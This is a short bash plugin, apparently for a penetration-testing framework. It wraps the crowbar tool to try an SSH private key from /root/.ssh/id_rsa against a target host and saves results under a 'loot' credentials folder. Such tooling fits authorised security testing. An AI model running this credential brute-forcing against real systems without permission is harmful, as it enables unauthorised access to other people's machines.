PLUGIN_NAME="crowbar"

plugin_init() {
  command -v crowbar &>/dev/null
}

plugin_run() {
  local target="$1"
  local outdir="$LOOT_DIR/credentials/bruteforce"
  mkdir -p "$outdir"
  crowbar -b sshkey -s "$target/32" -k /root/.ssh/id_rsa -o "$outdir/crowbar-$target.txt" 2>/dev/null
}

plugin_parse_output() {
  local result_file="$1"
  [[ -f "$result_file" ]] && cat "$result_file" || true
}
